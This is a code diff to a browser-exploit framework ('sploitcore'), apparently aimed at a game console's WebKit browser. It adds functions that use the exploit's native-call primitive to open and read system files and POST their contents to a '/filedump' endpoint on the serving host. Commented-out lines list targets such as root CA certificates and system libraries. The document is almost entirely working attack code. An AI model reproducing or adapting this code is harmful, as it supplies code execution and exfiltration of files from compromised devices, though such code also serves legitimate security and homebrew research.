@@ -601,6 +601,78 @@ sploitcore.prototype.querymem = function(addr, raw) {
 	return data;
 };
 
+sploitcore.prototype.str2buf = function(str) {
+	var buf = this.malloc(str.length + 8);
+	// Shitty memcpy of the string into buffer
+	for (var i = 0; i < 0x100 && i < str.length; i += 4) {
+		var val = 0;
+		for (var j = 0; j < 4 && i + j < str.length; j++) {
+			val |= (str.charCodeAt(i+j) & 0xFF) << (8 * j);
+		}
+		this.write4(val, buf, i >> 2);
+	}
+	if (str.length % 4 == 0) {
+		this.write4(0, buf, str.length >> 2);
+	}
+
+	return buf;
+
+}
+
+sploitcore.prototype.getFileSize = function(fhandle) {
+	var fseek = 0x438B18;
+	var ftell = 0x438BE0;
+
+	this.call(fseek, [fhandle, [0, 0], [2, 0]]);
+	var fsize = this.call(ftell, [fhandle]);
+	this.call(fseek, [fhandle, [0, 0], [0, 0]]);
+
+	return fsize;       
+}
+
+sploitcore.prototype.dumpFile = function(fn) {
+	var native_malloc = 0x1E8;
+	var native_free = 0x210;
+	var fopen = 0x43DDB4;
+	var fseek = 0x438B18;
+	var ftell = 0x438BE0;
+	var fread = 0x438A14;
+
+	var namebuf = this.str2buf(fn);
+	var modebuf = this.str2buf('r');
+
+	var fhandle = this.call(fopen, [namebuf, modebuf]);
+	if (fhandle[0] != 0 || fhandle[1] != 0) {
+		var fsize = this.getFileSize(fhandle);
+		var ofs = 0;
+		var arr = new ArrayBuffer(0x800000);
+		var int8view = new Uint8Array(arr);
+		var outbuf = this.read8(this.getAddr(int8view), 4);
+		var sz = fsize[0];
+		while (sz > 0) {
+			if (sz < 0x800000) {
+				arr = new ArrayBuffer(sz);
+				int8view = new Uint8Array(arr);
+				outbuf = this.read8(this.getAddr(int8view), 4);
+			}
+			this.call(fread, [outbuf, [0x1, 0], [sz < 0x800000 ? sz : 0x800000, 0], fhandle]);
+			var xhr = new XMLHttpRequest();
+			xhr.open('POST', '/filedump', false);
+			xhr.setRequestHeader('Content-Type', 'application/octet-stream');
+			xhr.setRequestHeader('Content-Disposition', fn);
+			xhr.send(int8view);
+			xhr = null;
+			sz -= 0x800000;
+		}
+		log(fn + ' is ' + paddr(fsize) + ' bytes.');
+	} else {
+		log('Failed to open file '+ fn + '!');
+	}
+
+	this.free(namebuf);
+	this.free(modebuf);
+}
+
 sploitcore.prototype.bridge = function(ptr, rettype) {
 	if(typeof(ptr) == 'number')
 		ptr = add2(this.mainaddr, ptr);
@@ -680,4 +752,31 @@ function main() {
 			break;
 		}
 	}
+	
+	//folders
+	//sc.dumpFile('shareddata:/');
+	//sc.dumpFile('oceanShared:/');
+	//sc.dumpFile('shareddata:/webdatabase');
+	//sc.dumpFile('shareddata:/browser/emoji');
+	//sc.dumpFile('shareddata:/browser/page');
+	
+	//files
+	//sc.dumpFile('shareddata:/buildinfo/buildinfo.dat');
+	//sc.dumpFile('shareddata:/browser/Skin.dat');
+	//sc.dumpFile('shareddata:/browser/MediaControls.css');
+	//sc.dumpFile('shareddata:/browser/MediaControls.js');
+	//sc.dumpFile('shareddata:/browser/ErrorPageTemplate.html');
+	//sc.dumpFile('shareddata:/browser/ErrorPageSubFrameTemplate.html');
+	//sc.dumpFile('shareddata:/browser/ErrorPageFilteringTemplate.html');
+	//sc.dumpFile('shareddata:/browser/UserCss.dat');
+	//sc.dumpFile('shareddata:/browser/RootCaSdk.pem');
+	//sc.dumpFile('shareddata:/browser/RootCaEtc.pem');
+	//sc.dumpFile('shareddata:/browser/effective_tld_names.dat');
+	//sc.dumpFile('shareddata:/.nrr/netfront.nrr');
+	//sc.dumpFile('shareddata:/dll/peer_wkc.nro');
+	//sc.dumpFile('shareddata:/dll/oss_wkc.nro');
+	//sc.dumpFile('shareddata:/dll/cairo_wkc.nro');
+	//sc.dumpFile('shareddata:/dll/libfont.nro');
+	//sc.dumpFile('shareddata:/dll/webkit_wkc.nro');
+	//sc.dumpFile('data:/sound/cruiser.bfsar');
 }
